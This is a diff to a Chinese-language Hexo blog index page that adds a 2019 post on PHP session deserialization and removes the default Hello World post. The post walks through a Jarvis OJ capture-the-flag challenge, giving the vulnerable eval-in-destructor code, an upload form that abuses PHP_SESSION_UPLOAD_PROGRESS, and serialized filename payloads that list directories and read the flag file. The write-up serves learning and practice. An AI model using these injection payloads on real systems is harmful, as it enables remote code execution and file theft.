@@ -156,6 +156,131 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-PHP-session反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/11/03/PHP-session反序列化/">PHP session反序列化</a>
+    </h1>
+  
+
+        
+        <a href="/2019/11/03/PHP-session反序列化/" class="archive-article-date">
+  	<time datetime="2019-11-03T06:03:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。</p>
+<hr>
+<h2 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h2><p>当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookies、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存</p>
+<hr>
+<h2 id="PHP-session的几个常见配置"><a href="#PHP-session的几个常见配置" class="headerlink" title="PHP session的几个常见配置"></a>PHP session的几个常见配置</h2><p>session.upload_progress.enabled<br>启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。</p>
+<p>session.serialize_handler<br>定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同</p>
+<p>session.save_path<br>session文件的存储位置</p>
+<p>session.auto_start=0<br>表明默认不启动session</p>
+<p>session.save_handler=files<br>session文件的存储方式</p>
+<hr>
+<h2 id="PHP-session序列化及反序列化处理器"><a href="#PHP-session序列化及反序列化处理器" class="headerlink" title="PHP session序列化及反序列化处理器"></a>PHP session序列化及反序列化处理器</h2><p>php在session存储和读取时,都会有一个序列化和反序列化的过程，序列化、反序列化中会调用对象的magic方法,比如<strong>destruct(),</strong>wakeup()等<br>PHP 内置了多种处理器用于处理 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：</p>
+<pre><code>php_binary：存储格式为，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值
+
+php：存储格式为，键名+竖线+经过serialize函数序列化处理的值
+
+php_serialize(php&gt;5.5.4)：存储格式为，经过serialize函数序列化处理的值</code></pre><p>具体用哪个处理器，由session.serialize_handler来定义。</p>
+<hr>
+<h2 id="一道php-session反序列化漏洞的题"><a href="#一道php-session反序列化漏洞的题" class="headerlink" title="一道php session反序列化漏洞的题"></a>一道php session反序列化漏洞的题</h2><p>jarvis上的PHPINFO:<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a><br>代码：</p>
+<pre><code>&lt;?php
+//A webshell is wait for you
+ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = &apos;phpinfo();&apos;;
+    }
+
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET[&apos;phpinfo&apos;]))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents(&apos;index.php&apos;));
+}
+?&gt;</code></pre><p>看到PHP代码中的ini_set(‘session.serialize_handler‘, ‘php‘)猜到这道题目可能与PHP中的Session序列话的问题有关，看了下phpinfo(),发现</p>
+<pre><code>session.serialize_handler：php_serialize
+session.upload_progress.enabled：on</code></pre><p>php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。这个漏洞如果要触发，则需要在服务器中写入一个使用php_serialize序列话的值，然后访问index.php时就会被php的引擎反序列化。但是本题中没有提供写入session的方法，但时session.upload_progress.enabled这个是开着的，我们可以借此向服务器设置session，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;test XXE&lt;/title&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action=&quot;http://127.0.0.1/b/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--不对字符编码--&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
+        &lt;input type=&quot;file&quot; name=&quot;file&quot;  /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>获取项目路径：<br>通过dirname获取文件路径<br>设置$mdzz=‘print_r(dirname(<strong>FILE</strong>));‘<br>序列化得到的结果是O:5:”OowoO”:1:{s:4:”mdzz”;s:27:”print_r(dirname(<strong>FILE</strong>));”;}<br>文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}<br>opt/lampp/htdocs</p>
+<p>获取文件列表<br>通过scandir获取文件列表<br>设置$mdzz=‘print_r(scandir(“/opt/lampp/htdocs”));‘<br>序列化的结果是O:5:”OowoO”:1:{s:4:”mdzz”;s:38:”print_r(scandir(“/opt/lampp/htdocs”));”;}<br>文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:38:&quot;print_r(scandir(&quot;/opt/lampp/htdocs&quot;));&quot;;}<br>发现存在Here_1s_7he_fl4g_buT_You_Cannot_see.php。</p>
+<p>读取文件内容：<br>通过file_get_contents读取文件内容<br>设置$mdzz=print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));<br>序列话结果O:5:”OowoO”:1:{s:4:”mdzz”;s:88:”print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));”;}<br>文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;}。</p>
+<p>最后就得到flag了。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/11/03/PHP-session反序列化/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-序列化与反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -996,81 +1121,6 @@ exit;
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/08/30/kali-暴力破解WiFi密码/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/25/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/25/hello-world/" class="archive-article-date">
-  	<time datetime="2019-08-25T10:46:19.649Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/25/hello-world/">展开全文 >></a>
         </p>
       
 
